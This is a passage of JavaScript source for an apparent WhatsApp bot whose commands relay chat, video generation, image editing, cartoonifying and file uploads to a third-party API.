                          jsonString.match(/"reply":"([^"]+)"/) ||
                          jsonString.match(/"message":"([^"]+)"/);
        if (textMatch) reply = textMatch[1];
      }

      if (!reply) {
        return await sock.sendMessage(from, { 
          text: `❌ No response from AI. Please try again.` 
        });
      }

      // ==========================================================
      // Clean up the response
      // ==========================================================
      reply = reply.replace(/\\n/g, '\n').replace(/\\"/g, '"').replace(/\\t/g, '  ');

      // Truncate if too long (WhatsApp limit ~65k)
      if (reply.length > 65000) {
        reply = reply.slice(0, 65000) + '\n\n... (truncated)';
      }

      // ==========================================================
      // Split into chunks if needed (WhatsApp message limit)
      // ==========================================================
      if (reply.length > 1000) {
        // Try to split by paragraphs or sentences
        const chunks = reply.match(/[^\n]{1,1000}(?:\n|$)/g) || [reply];
        
        for (let i = 0; i < Math.min(chunks.length, 5); i++) {
          const chunk = chunks[i].trim();
          if (!chunk) continue;
          
          const prefix = i === 0 ? `🤖 *Claude AI:*\n\n` : `\n*...continued*\n\n`;
          await sock.sendMessage(from, { text: prefix + chunk });
          // Small delay between messages
          await new Promise(r => setTimeout(r, 300));
        }
      } else {
        await sock.sendMessage(from, { 
          text: `🤖 *Claude AI:*\n\n${reply}` 
        });
      }

    } catch (error) {
      console.error('Chatbot error:', error);
      await sock.sendMessage(from, { 
        text: `⚠️ Error: ${error.message || 'Could not reach AI service.'}\n\n💡 Try:\n• ${prefix}${command} reset (clear history)\n• ${prefix}${command} Hello (start fresh)\n• ${prefix}${command} What is AI? --search (with web search)` 
      });
    }
  }
});
register({
  name: 'veo3',
  aliases: ['veo', 'aivideo', 'genvideo', 'veo2'],
  category: 'AI',
  description: 'Generate AI videos from text prompts (Veo3/Veo2)',
  async execute({ sock, from, args, prefix, command }) {
    // ==========================================================
    // Check if user provided a prompt
    // ==========================================================
    if (!args[0]) {
      return await sock.sendMessage(from, { 
        text: `🎬 *Veo3 AI Video Generator*\n\nUsage: ${prefix}${command} <prompt>\nExample: ${prefix}${command} a cute cat eating bread\n\n*Examples:*\n${prefix}${command} sunset over ocean waves, cinematic slow motion\n${prefix}${command} futuristic city at night with neon lights\n${prefix}${command} a robot dancing in a cyberpunk alley\n${prefix}${command} a dog running through a flower field, slow motion\n\n*Note:* Generation takes 30-60 seconds. You will get a short MP4 video.` 
      });
    }

    const prompt = args.join(" ");

    await sock.sendMessage(from, { 
      text: `🎬 *Generating video...*\n⏳ Prompt: *${prompt}*\n\nThis may take 30-60 seconds...` 
    });

    try {
      // ==========================================================
      // Call Veo3 API (primary endpoint)
      // ==========================================================
      const baseUrl = 'https://omegatech-api.dixonomega.tech';
      const response = await fetch(`${baseUrl}/api/ai/veo3`, {
        method: 'POST',
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
          'Content-Type': 'application/json',
          'Accept': 'application/json'
        },
        body: JSON.stringify({
          prompt: prompt
        })
      });

      if (!response.ok) {
        throw new Error(`API returned ${response.status}`);
      }

      const data = await response.json();

      // ==========================================================
      // Extract video URL
      // ==========================================================
      let videoUrl = data.result?.url || data.result?.video_url || data.result?.video || 
                     data.url || data.video_url || data.video || data.download_url;

      if (!videoUrl) {
        // Try to find a URL in the response
        const jsonString = JSON.stringify(data);
        const urlMatch = jsonString.match(/https?:\/\/[^\s"']+\.(mp4|mov|webm|mkv)/i);
        if (urlMatch) videoUrl = urlMatch[0];
      }

      if (!videoUrl) {
        return await sock.sendMessage(from, { 
          text: `❌ No video URL returned from the API.\n\n💡 Try a different prompt or try again later.` 
        });
      }

      // ==========================================================
      // Download the video
      // ==========================================================
      const videoResponse = await fetch(videoUrl, {
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
      });

      if (!videoResponse.ok) {
        throw new Error(`Failed to download video: ${videoResponse.status}`);
      }

      const videoBuffer = Buffer.from(await videoResponse.arrayBuffer());

      if (videoBuffer.length < 5000) {
        return await sock.sendMessage(from, { 
          text: `❌ Generated video is too small (${videoBuffer.length} bytes). The generation may have failed.` 
        });
      }

      const fileSizeMB = (videoBuffer.length / 1024 / 1024).toFixed(2);

      // ==========================================================
      // Send the video
      // ==========================================================
      const caption = `🎬 *Veo3 AI Video*\n\n📝 *Prompt:* ${prompt}\n📦 *Size:* ${fileSizeMB} MB\n\n✅ *Generated Successfully*\n\n✨ _Powered by OmegaTech Veo3_`;

      // If video is too large (WhatsApp 16MB limit), send as document
      if (videoBuffer.length > 16 * 1024 * 1024) {
        await sock.sendMessage(from, {
          document: videoBuffer,
          mimetype: 'video/mp4',
          fileName: `veo3_${Date.now()}.mp4`,
          caption: caption + '\n\n⚠️ *Sent as document due to 16MB limit.*'
        });
      } else {
        try {
          await sock.sendMessage(from, {
            video: videoBuffer,
            mimetype: 'video/mp4',
            caption: caption,
            gifPlayback: false
          });
        } catch (sendErr) {
          // Fallback: send as document if video sending fails
          await sock.sendMessage(from, {
            document: videoBuffer,
            mimetype: 'video/mp4',
            fileName: `veo3_${Date.now()}.mp4`,
            caption: caption
          });
        }
      }

    } catch (error) {
      console.error('Veo3 error:', error);
      
      // ==========================================================
      // Try alternative endpoint (Veo3-v3)
      // ==========================================================
      try {
        await sock.sendMessage(from, { text: `⏳ Trying alternative endpoint...` });
        
        const altResponse = await fetch(`${baseUrl}/api/ai/Veo3-v3`, {
          method: 'POST',
          headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Content-Type': 'application/json',
            'Accept': 'application/json'
          },
          body: JSON.stringify({
            prompt: prompt
          })
        });

        if (altResponse.ok) {
          const altData = await altResponse.json();
          
          let videoUrl = altData.result?.url || altData.result?.video_url || altData.result?.video || 
                         altData.url || altData.video_url || altData.video;

          if (videoUrl) {
            const videoRes = await fetch(videoUrl);
            const videoBuf = Buffer.from(await videoRes.arrayBuffer());
            
            if (videoBuf.length > 5000) {
              const sizeMB = (videoBuf.length / 1024 / 1024).toFixed(2);
              
              if (videoBuf.length > 16 * 1024 * 1024) {
                await sock.sendMessage(from, {
                  document: videoBuf,
                  mimetype: 'video/mp4',
                  fileName: `veo3_${Date.now()}.mp4`,
                  caption: `🎬 *Veo3 AI Video*\n📝 ${prompt}\n📦 ${sizeMB} MB\n\n✅ Generated (alt endpoint)`
                });
              } else {
                await sock.sendMessage(from, {
                  video: videoBuf,
                  mimetype: 'video/mp4',
                  caption: `🎬 *Veo3 AI Video*\n📝 ${prompt}\n📦 ${sizeMB} MB\n\n✅ Generated (alt endpoint)`
                });
              }
              return;
            }
          }
        }
      } catch (altError) {
        console.warn('Alternative Veo3 endpoint failed:', altError.message);
      }

      // ==========================================================
      // All attempts failed
      // ==========================================================
      await sock.sendMessage(from, { 
        text: `⚠️ Video Generation Error: ${error.message || 'Could not generate video.'}\n\n💡 Try:\n• A shorter prompt\n• A simpler scene description\n• ${prefix}${command} sunset over ocean\n• ${prefix}${command} a cat sleeping\n\n💡 Or try again later.` 
      });
    }
  }
});
register({
  name: 'blackbox',
  aliases: ['bb', 'blackboxai', 'bbai', '80models'],
  category: 'AI',
  description: 'Chat with Blackbox AI (80+ models) with session memory',
  async execute({ sock, from, args, prefix, command, sessionId }) {
    // ==========================================================
    // Check if user provided a message or action
    // ==========================================================
    if (!args[0]) {
      return await sock.sendMessage(from, { 
        text: `📦 *Blackbox AI (80+ Models)*\n\nUsage: ${prefix}${command} <message>\nExample: ${prefix}${command} What is the capital of France?\n\n*Actions:*\n• ${prefix}${command} models - List all available models\n• ${prefix}${command} delete_session - Clear conversation history\n\n*Options (advanced):*\n• ${prefix}${command} <message> --model <model_id>\n• ${prefix}${command} <message> --temp <0-1>\n\n*Examples:*\n${prefix}${command} Hello\n${prefix}${command} Explain AI --model gpt-4\n${prefix}${command} Write a poem --temp 0.9` 
      });
    }

    const userMessage = args.join(" ");
    const isModels = userMessage.toLowerCase().trim() === 'models';
    const isDeleteSession = userMessage.toLowerCase().trim() === 'delete_session';

    // ==========================================================
    // Handle "models" action - list all available models
    // ==========================================================
    if (isModels) {
      await sock.sendMessage(from, { text: `⏳ Fetching available models...` });
      
      try {
        const baseUrl = 'https://omegatech-api.dixonomega.tech';
        const response = await fetch(`${baseUrl}/api/ai/Blackbox?action=models`, {
          headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json'
          }
        });

        if (!response.ok) throw new Error(`API returned ${response.status}`);
        const data = await response.json();

        let models = data.result || data.models || data.data || [];
        
        if (!models.length) {
          return await sock.sendMessage(from, { 
            text: `❌ Could not fetch model list. Try again later.` 
          });
        }

        let msg = `📦 *Blackbox AI Models (${models.length} available)*\n\n`;
        
        // Show first 20 models
        const maxDisplay = Math.min(models.length, 20);
        for (let i = 0; i < maxDisplay; i++) {
          const m = models[i];
          const name = m.name || m.id || m.model || 'Unknown';
          const desc = m.description || m.desc || '';
          msg += `• *${name}*${desc ? ` — ${desc}` : ''}\n`;
        }
        
        if (models.length > 20) {
          msg += `\n*...and ${models.length - 20} more models.*`;
        }
        
        msg += `\n\n💡 Use: ${prefix}${command} <message> --model <model_id>`;
        
        await sock.sendMessage(from, { text: msg });
        
      } catch (error) {
        await sock.sendMessage(from, { 
          text: `⚠️ Error fetching models: ${error.message}` 
        });
      }
      return;
    }

    // ==========================================================
    // Handle "delete_session" action - clear history
    // ==========================================================
    if (isDeleteSession) {
      const sessionKey = `blackbox_${sessionId || from}`;
      if (global.blackboxSessions) {
        delete global.blackboxSessions[sessionKey];
      }
      return await sock.sendMessage(from, { 
        text: `🧹 *Blackbox session cleared.*\nStart fresh with: ${prefix}${command} Hello` 
      });
    }

    // ==========================================================
    // Parse user message and options
    // ==========================================================
    let cleanMessage = userMessage;
    let modelId = null;
    let temperature = null;
    let maxTokens = null;

    // Extract --model flag
    const modelMatch = userMessage.match(/--model\s+([^\s]+)/);
    if (modelMatch) {
      modelId = modelMatch[1];
      cleanMessage = cleanMessage.replace(/--model\s+[^\s]+/, '').trim();
    }

    // Extract --temp flag
    const tempMatch = userMessage.match(/--temp\s+([0-9.]+)/);
    if (tempMatch) {
      temperature = parseFloat(tempMatch[1]);
      if (temperature < 0 || temperature > 1) temperature = 0.7;
      cleanMessage = cleanMessage.replace(/--temp\s+[0-9.]+/, '').trim();
    }

    // Extract --max flag
    const maxMatch = userMessage.match(/--max\s+(\d+)/);
    if (maxMatch) {
      maxTokens = parseInt(maxMatch[1]);
      if (maxTokens < 1 || maxTokens > 10000) maxTokens = 1000;
      cleanMessage = cleanMessage.replace(/--max\s+\d+/, '').trim();
    }

    if (!cleanMessage) {
      return await sock.sendMessage(from, { 
        text: `❌ Please provide a message after removing flags.\n\nExample: ${prefix}${command} Hello --model gpt-4` 
      });
    }

    // ==========================================================
    // Generate session ID for this user
    // ==========================================================
    const userSessionId = sessionId || from.split('@')[0];

    await sock.sendMessage(from, { 
      text: `📦 *Blackbox AI thinking...*\n${modelId ? `🧠 Model: ${modelId}\n` : ''}${temperature ? `🌡️ Temp: ${temperature}\n` : ''}⏳ Please wait...` 
    });

    try {
      // ==========================================================
      // Call Blackbox API
      // ==========================================================
      const baseUrl = 'https://omegatech-api.dixonomega.tech';
      const apiUrl = new URL(`${baseUrl}/api/ai/Blackbox`);
      
      apiUrl.searchParams.append('chat', cleanMessage);
      apiUrl.searchParams.append('sessionId', userSessionId);
      
      if (modelId) apiUrl.searchParams.append('model', modelId);
      if (temperature !== null) apiUrl.searchParams.append('temperature', temperature.toString());
      if (maxTokens) apiUrl.searchParams.append('max_tokens', maxTokens.toString());

      const response = await fetch(apiUrl.toString(), {
        method: 'GET',
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
          'Accept': 'application/json'
        }
      });

      if (!response.ok) {
        throw new Error(`API returned ${response.status}`);
      }

      const data = await response.json();

      // ==========================================================
      // Extract response
      // ==========================================================
      let reply = data.result || data.response || data.reply || data.message || data.text;

      if (!reply) {
        const jsonString = JSON.stringify(data);
        const textMatch = jsonString.match(/"result":"([^"]+)"/) || 
                          jsonString.match(/"response":"([^"]+)"/) ||
                          jsonString.match(/"reply":"([^"]+)"/) ||
                          jsonString.match(/"message":"([^"]+)"/);
        if (textMatch) reply = textMatch[1];
      }

      if (!reply) {
        return await sock.sendMessage(from, { 
          text: `❌ No response from Blackbox AI. Please try again.` 
        });
      }

      // ==========================================================
      // Clean up and format response
      // ==========================================================
      reply = reply.replace(/\\n/g, '\n').replace(/\\"/g, '"').replace(/\\t/g, '  ');

      // Truncate if too long
      if (reply.length > 65000) {
        reply = reply.slice(0, 65000) + '\n\n... (truncated)';
      }

      // ==========================================================
      // Split into chunks if needed
      // ==========================================================
      if (reply.length > 1000) {
        const chunks = reply.match(/[^\n]{1,1000}(?:\n|$)/g) || [reply];
        
        const modelDisplay = modelId ? ` (${modelId})` : '';
        
        for (let i = 0; i < Math.min(chunks.length, 5); i++) {
          const chunk = chunks[i].trim();
          if (!chunk) continue;
          
          const prefix = i === 0 ? `📦 *Blackbox AI${modelDisplay}:*\n\n` : `\n*...continued*\n\n`;
          await sock.sendMessage(from, { text: prefix + chunk });
          await new Promise(r => setTimeout(r, 300));
        }
      } else {
        const modelDisplay = modelId ? ` (${modelId})` : '';
        await sock.sendMessage(from, { 
          text: `📦 *Blackbox AI${modelDisplay}:*\n\n${reply}` 
        });
      }

    } catch (error) {
      console.error('Blackbox error:', error);
      await sock.sendMessage(from, { 
        text: `⚠️ Error: ${error.message || 'Could not reach Blackbox AI.'}\n\n💡 Try:\n• ${prefix}${command} delete_session (clear history)\n• ${prefix}${command} Hello (start fresh)\n• ${prefix}${command} models (see available models)` 
      });
    }
  }
});
register({
  name: 'claudepro',
  aliases: ['claudep', 'deepai', 'claudeai', 'cp'],
  category: 'AI',
  description: 'Full DeepAI — 15+ models, vision, image generation, and editing',
  async execute({ sock, from, msg, quoted, args, prefix, command, sessionId }) {
    // ==========================================================
    // Check if user provided a message or action
    // ==========================================================
    if (!args[0]) {
      return await sock.sendMessage(from, { 
        text: `🧠 *Claude Pro (DeepAI)*\n\n*Chat:*\n${prefix}${command} <message>\n${prefix}${command} What is AI? --model llama-4-scout\n\n*Vision (reply to image):*\n${prefix}${command} What's in this image? --vision\n\n*Generate Image:*\n${prefix}${command} generate a beautiful sunset --generate\n${prefix}${command} anime girl --generate --size landscape\n\n*Edit Image (reply to image):*\n${prefix}${command} make it black and white --edit\n\n*Models:* ${prefix}${command} models\n*Clear session:* ${prefix}${command} clear` 
      });
    }

    const userMessage = args.join(" ");
    const isModels = userMessage.toLowerCase().trim() === 'models';
    const isClear = userMessage.toLowerCase().trim() === 'clear';

    // ==========================================================
    // Handle "models" action
    // ==========================================================
    if (isModels) {
      await sock.sendMessage(from, { text: `⏳ Fetching available models...` });
      
      try {
        const baseUrl = 'https://omegatech-api.dixonomega.tech';
        const response = await fetch(`${baseUrl}/api/ai/Claude-pro?action=models`, {
          headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json'
          }
        });

        if (!response.ok) throw new Error(`API returned ${response.status}`);
        const data = await response.json();

        let models = data.result || data.models || data.data || [];
        
        if (!models.length) {
          return await sock.sendMessage(from, { 
            text: `❌ Could not fetch model list.` 
          });
        }

        let msg = `🧠 *Claude Pro Models (${models.length}+)*\n\n`;
        const maxDisplay = Math.min(models.length, 25);
        
        for (let i = 0; i < maxDisplay; i++) {
          const m = models[i];
          const name = m.name || m.id || m.model || 'Unknown';
          msg += `• *${name}*\n`;
        }
        
        if (models.length > 25) {
          msg += `\n*...and ${models.length - 25} more.*`;
        }
        
        msg += `\n\n💡 Use: ${prefix}${command} <message> --model <model_id>`;
        await sock.sendMessage(from, { text: msg });
        
      } catch (error) {
        await sock.sendMessage(from, { text: `⚠️ Error: ${error.message}` });
      }
      return;
    }

    // ==========================================================
    // Handle "clear" action - reset session
    // ==========================================================
    if (isClear) {
      const sessionKey = `claudepro_${sessionId || from}`;
      if (global.claudeProSessions) {
        delete global.claudeProSessions[sessionKey];
      }
      return await sock.sendMessage(from, { 
        text: `🧹 *Claude Pro session cleared.*\nStart fresh with: ${prefix}${command} Hello` 
      });
    }

    // ==========================================================
    // Parse user message and options
    // ==========================================================
    let cleanMessage = userMessage;
    let model = 'llama-4-scout'; // default
    let persona = 'chat';
    let tools = 'all';
    let action = 'chat'; // chat | generate | edit
    let size = 'portrait';
    let version = 'hd';
    let imageUrl = null;
    let imageUuid = null;
    let isVision = false;

    // Check for actions
    if (userMessage.includes('--generate')) {
      action = 'generate';
      cleanMessage = cleanMessage.replace(/--generate/g, '').trim();
    } else if (userMessage.includes('--edit')) {
      action = 'edit';
      cleanMessage = cleanMessage.replace(/--edit/g, '').trim();
    } else if (userMessage.includes('--vision')) {
      isVision = true;
      cleanMessage = cleanMessage.replace(/--vision/g, '').trim();
    }

    // Extract --model flag
    const modelMatch = userMessage.match(/--model\s+([^\s]+)/);
    if (modelMatch) {
      model = modelMatch[1];
      cleanMessage = cleanMessage.replace(/--model\s+[^\s]+/, '').trim();
    }

    // Extract --persona flag
    const personaMatch = userMessage.match(/--persona\s+([^\s]+)/);
    if (personaMatch) {
      persona = personaMatch[1];
      cleanMessage = cleanMessage.replace(/--persona\s+[^\s]+/, '').trim();
    }

    // Extract --tools flag
    const toolsMatch = userMessage.match(/--tools\s+([^\s]+)/);
    if (toolsMatch) {
      tools = toolsMatch[1];
      cleanMessage = cleanMessage.replace(/--tools\s+[^\s]+/, '').trim();
    }

    // Extract --size flag (for generate)
    const sizeMatch = userMessage.match(/--size\s+(portrait|landscape|square)/);
    if (sizeMatch) {
      size = sizeMatch[1];
      cleanMessage = cleanMessage.replace(/--size\s+[^\s]+/, '').trim();
    }

    // Extract --version flag (for generate/edit)
    const versionMatch = userMessage.match(/--version\s+(sd|hd|ultra)/);
    if (versionMatch) {
      version = versionMatch[1];
      cleanMessage = cleanMessage.replace(/--version\s+[^\s]+/, '').trim();
    }

    if (!cleanMessage && action !== 'vision') {
      return await sock.sendMessage(from, { 
        text: `❌ Please provide a message or prompt.\n\nExample: ${prefix}${command} Hello --model llama-4-scout` 
      });
    }

    // ==========================================================
    // Check for image in quoted message (vision/edit)
    // ==========================================================
    const target = quoted || msg;
    if (isVision || action === 'edit') {
      if (target.message?.imageMessage) {
        imageUrl = target.message.imageMessage.url || target.message.imageMessage.caption;
      } else if (target.message?.documentMessage?.mimetype?.includes('image')) {
        imageUrl = target.message.documentMessage.url;
      } else if (target.message?.stickerMessage) {
        imageUrl = target.message.stickerMessage.url;
      }

      if (!imageUrl) {
        return await sock.sendMessage(from, { 
          text: `❌ Please reply to an image for vision/edit.\n\n${isVision ? 'Example: reply to a photo with:\n' : ''}${prefix}${command} What's in this image? --vision` 
        });
      }
    }

    // ==========================================================
    // Generate session ID
    // ==========================================================
    const userSessionId = sessionId || from.split('@')[0];

    // ==========================================================
    // Send status message
    // ==========================================================
    let statusMsg = `🧠 *Claude Pro processing...*\n`;
    if (action === 'generate') statusMsg += `🎨 Generating image: *${cleanMessage}*\n`;
    else if (action === 'edit') statusMsg += `✏️ Editing image: *${cleanMessage}*\n`;
    else if (isVision) statusMsg += `👁️ Analyzing image...\n`;
    else statusMsg += `💬 Model: ${model}\n`;
    statusMsg += `⏳ Please wait...`;
    
    await sock.sendMessage(from, { text: statusMsg });

    try {
      // ==========================================================
      // Call Claude Pro API
      // ==========================================================
      const baseUrl = 'https://omegatech-api.dixonomega.tech';
      const apiUrl = new URL(`${baseUrl}/api/ai/Claude-pro`);
      
      // Set the primary action
      if (action === 'generate') {
        apiUrl.searchParams.append('generate', cleanMessage);
        apiUrl.searchParams.append('size', size);
        apiUrl.searchParams.append('version', version);
      } else if (action === 'edit' && imageUrl) {
        apiUrl.searchParams.append('edit', cleanMessage);
        apiUrl.searchParams.append('image', imageUrl);
        apiUrl.searchParams.append('version', version);
      } else if (isVision && imageUrl) {
        // For vision, we need to upload first then chat
        // Option 1: Direct vision via upload action
        apiUrl.searchParams.append('upload', imageUrl);
        // Then we'll need a second request with the UUID
        // But the API might support direct vision via chat + image param
        apiUrl.searchParams.append('chat', cleanMessage);
        apiUrl.searchParams.append('model', model);
        apiUrl.searchParams.append('persona', persona);
        apiUrl.searchParams.append('tools', tools);
        apiUrl.searchParams.append('sessionId', userSessionId);
        // Try to pass image directly
        apiUrl.searchParams.append('image_url', imageUrl);
      } else {
        // Default: chat
        apiUrl.searchParams.append('chat', cleanMessage);
        apiUrl.searchParams.append('model', model);
        apiUrl.searchParams.append('persona', persona);
        apiUrl.searchParams.append('tools', tools);
        apiUrl.searchParams.append('sessionId', userSessionId);
        apiUrl.searchParams.append('clear', 'false');
      }

      const response = await fetch(apiUrl.toString(), {
        method: 'GET',
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
          'Accept': 'application/json'
        }
      });

      if (!response.ok) {
        throw new Error(`API returned ${response.status}`);
      }

      const data = await response.json();

      // ==========================================================
      // Extract response
      // ==========================================================
      let reply = data.result || data.response || data.reply || data.message || data.text;
      let mediaUrl = data.url || data.image || data.video || data.generated;

      // ==========================================================
      // Handle image generation/edit response
      // ==========================================================
      if ((action === 'generate' || action === 'edit') && mediaUrl) {
        const imgRes = await fetch(mediaUrl);
        const imgBuf = Buffer.from(await imgRes.arrayBuffer());
        
        if (imgBuf.length > 1000) {
          const caption = action === 'generate' ? 
            `🎨 *Generated Image*\n📝 ${cleanMessage}\n📐 ${size}\n\n✅ Success` :
            `✏️ *Edited Image*\n📝 ${cleanMessage}\n\n✅ Success`;
          
          await sock.sendMessage(from, {
            image: imgBuf,
            caption: caption
          });
          return;
        }
      }

      // ==========================================================
      // Handle chat/vision response
      // ==========================================================
      if (!reply) {
        const jsonString = JSON.stringify(data);
        const textMatch = jsonString.match(/"result":"([^"]+)"/) || 
                          jsonString.match(/"response":"([^"]+)"/) ||
                          jsonString.match(/"reply":"([^"]+)"/) ||
                          jsonString.match(/"message":"([^"]+)"/);
        if (textMatch) reply = textMatch[1];
      }

      if (!reply) {
        return await sock.sendMessage(from, { 
          text: `❌ No response from Claude Pro. Please try again.` 
        });
      }

      // Clean up
      reply = reply.replace(/\\n/g, '\n').replace(/\\"/g, '"').replace(/\\t/g, '  ');
      if (reply.length > 65000) reply = reply.slice(0, 65000) + '\n\n... (truncated)';

      // ==========================================================
      // Send response (split if needed)
      // ==========================================================
      const modelDisplay = model ? ` (${model})` : '';
      
      if (reply.length > 1000) {
        const chunks = reply.match(/[^\n]{1,1000}(?:\n|$)/g) || [reply];
        for (let i = 0; i < Math.min(chunks.length, 5); i++) {
          const chunk = chunks[i].trim();
          if (!chunk) continue;
          const prefix = i === 0 ? `🧠 *Claude Pro${modelDisplay}:*\n\n` : `\n*...continued*\n\n`;
          await sock.sendMessage(from, { text: prefix + chunk });
          await new Promise(r => setTimeout(r, 300));
        }
      } else {
        await sock.sendMessage(from, { 
          text: `🧠 *Claude Pro${modelDisplay}:*\n\n${reply}` 
        });
      }

    } catch (error) {
      console.error('Claude Pro error:', error);
      await sock.sendMessage(from, { 
        text: `⚠️ Error: ${error.message || 'Could not reach Claude Pro.'}\n\n💡 Try:\n• ${prefix}${command} clear (reset session)\n• ${prefix}${command} Hello\n• ${prefix}${command} models\n• Check your syntax` 
      });
    }
  }
});

register({
  name: 'upload',
  aliases: ['kappa', 'uploadfile', 'filehost'],
  category: 'TOOLS',
  description: 'Upload files to kappa.lol (permanent hosting) - reply to a file',
  async execute({ sock, from, msg, quoted, args, prefix, command }) {
    // ==========================================================
    // Check if replying to a file
    // ==========================================================
    const target = quoted || msg;
    
    // Check for various file types
    let fileBuffer = null;
    let fileName = 'file';
    let mimeType = 'application/octet-stream';
    let hasFile = false;

    // Check image
    if (target.message?.imageMessage) {
      hasFile = true;
      fileName = target.message.imageMessage.caption || 'image.jpg';
      mimeType = target.message.imageMessage.mimetype || 'image/jpeg';
    }
    // Check video
    else if (target.message?.videoMessage) {
      hasFile = true;
      fileName = 'video.mp4';
      mimeType = target.message.videoMessage.mimetype || 'video/mp4';
    }
    // Check audio
    else if (target.message?.audioMessage) {
      hasFile = true;
      fileName = 'audio.mp3';
      mimeType = target.message.audioMessage.mimetype || 'audio/mpeg';
    }
    // Check document
    else if (target.message?.documentMessage) {
      hasFile = true;
      fileName = target.message.documentMessage.fileName || 'document';
      mimeType = target.message.documentMessage.mimetype || 'application/octet-stream';
    }
    // Check sticker
    else if (target.message?.stickerMessage) {
      hasFile = true;
      fileName = 'sticker.webp';
      mimeType = 'image/webp';
    }

    if (!hasFile) {
      return await sock.sendMessage(from, { 
        text: `📤 *Kappa Uploader*\n\nUsage: Reply to a file with: ${prefix}${command}\n\n*Supported files:*\n• Images (jpg, png, gif, webp)\n• Videos (mp4, mov, avi)\n• Audio (mp3, wav, ogg)\n• Documents (pdf, zip, txt, etc.)\n• Stickers\n\n*Note:* Files are uploaded to kappa.lol (permanent hosting).` 
      });
    }

    await sock.sendMessage(from, { text: `⏳ Uploading ${fileName}...` });

    try {
      // ==========================================================
      // Download the file from WhatsApp
      // ==========================================================
      const { downloadMediaMessage } = require('@whiskeysockets/baileys');
      
      let fileBuffer = null;
      try {
        fileBuffer = await downloadMediaMessage(
          target.message || target,
          'buffer',
          {},
          { reuploadRequest: sock.updateMediaMessage }
        );
      } catch (dlErr) {
        fileBuffer = await sock.downloadMediaMessage(target);
      }

      if (!fileBuffer || fileBuffer.length < 100) {
        return await sock.sendMessage(from, { 
          text: `❌ Failed to download file. Please try again.` 
        });
      }

      // ==========================================================
      // Create FormData for upload
      // ==========================================================
      const FormData = require('form-data');
      const form = new FormData();
      
      // Add file to form data
      form.append('file', fileBuffer, {
        filename: fileName,
        contentType: mimeType
      });

      // ==========================================================
      // Upload to Kappa
      // ==========================================================
      const baseUrl = 'https://omegatech-api.dixonomega.tech';
      const response = await fetch(`${baseUrl}/api/tools/Kappa-uploader`, {
        method: 'POST',
        headers: {
          ...form.getHeaders(),
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        },
        body: form
      });

      if (!response.ok) {
        throw new Error(`Upload failed: ${response.status}`);
      }

      const data = await response.json();

      // ==========================================================
      // Extract download link
      // ==========================================================
      let downloadUrl = data.result?.url || data.result?.download_url || 
                        data.url || data.download_url || data.link || data.file;

      if (!downloadUrl) {
        const jsonString = JSON.stringify(data);
        const urlMatch = jsonString.match(/https?:\/\/[^\s"']+/i);
        if (urlMatch) downloadUrl = urlMatch[0];
      }

      if (!downloadUrl) {
        return await sock.sendMessage(from, { 
          text: `❌ Upload completed but no download link was returned.` 
        });
      }

      // ==========================================================
      // Send the download link
      // ==========================================================
      const fileSize = (fileBuffer.length / 1024 / 1024).toFixed(2);
      
      await sock.sendMessage(from, {
        text: `📤 *File Uploaded Successfully!*\n\n` +
          `📁 *File:* ${fileName}\n` +
          `📦 *Size:* ${fileSize} MB\n` +
          `🔗 *Download Link:*\n${downloadUrl}\n\n` +
          `📌 *Powered by Kappa.lol*\n` +
          `✅ *Permanent Hosting*`
      });

    } catch (error) {
      console.error('Upload error:', error);
      await sock.sendMessage(from, { 
        text: `⚠️ Upload Error: ${error.message || 'Could not upload file.'}\n\n💡 Try:\n• A smaller file\n• A different file type\n• Check your internet connection` 
      });
    }
  }
});
register({
  name: 'tocartoon',
  aliases: ['cartoon', 'cartoonify', 'toon', 'animeify'],
  category: 'TOOLS',
  description: 'Convert a normal image into a realistic cartoon-style artwork',
  async execute({ sock, from, msg, quoted, args, prefix, command }) {
    // ==========================================================
    // Check if user provided a URL or replied to an image
    // ==========================================================
    let imageUrl = null;
    const target = quoted || msg;

    // Check if user provided a URL as argument
    if (args[0] && args[0].startsWith('http')) {
      imageUrl = args[0];
    }
    // Check if replying to an image
    else if (target.message?.imageMessage) {
      imageUrl = target.message.imageMessage.url || target.message.imageMessage.caption;
    }
    // Check if replying to a document (image)
    else if (target.message?.documentMessage?.mimetype?.includes('image')) {
      imageUrl = target.message.documentMessage.url;
    }
    // Check if replying to a sticker
    else if (target.message?.stickerMessage) {
      imageUrl = target.message.stickerMessage.url;
    }

    if (!imageUrl) {
      return await sock.sendMessage(from, { 
        text: `🎨 *Cartoonify Image*\n\nUsage: ${prefix}${command} <image_url>\nOr reply to an image with: ${prefix}${command}\n\n*Examples:*\n${prefix}${command} https://example.com/photo.jpg\nReply to a photo with ${prefix}${command}\n\n*Supports:*\n• Images (jpg, png, jpeg)\n• Stickers (webp)\n• Any image URL` 
      });
    }

    await sock.sendMessage(from, { text: `🎨 *Converting image to cartoon...*\n⏳ This may take 5-10 seconds...` });

    try {
      // ==========================================================
      // Call OmegaTech ToCartoon API
      // ==========================================================
      const baseUrl = 'https://omegatech-api.dixonomega.tech';
      const apiUrl = new URL(`${baseUrl}/api/tools/tocartoon`);
      apiUrl.searchParams.append('image', imageUrl);

      const response = await fetch(apiUrl.toString(), {
        method: 'GET',
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
          'Accept': 'application/json'
        }
      });

      if (!response.ok) {
        throw new Error(`API returned ${response.status}`);
      }

      const data = await response.json();

      // ==========================================================
      // Extract cartoon image URL
      // ==========================================================
      let cartoonUrl = data.result?.url || data.result?.image || data.result?.cartoon || 
                       data.url || data.image || data.cartoon || data.data;

      if (!cartoonUrl) {
        const jsonString = JSON.stringify(data);
        const urlMatch = jsonString.match(/https?:\/\/[^\s"']+\.(png|jpg|jpeg|gif|webp)/i);
        if (urlMatch) cartoonUrl = urlMatch[0];
      }

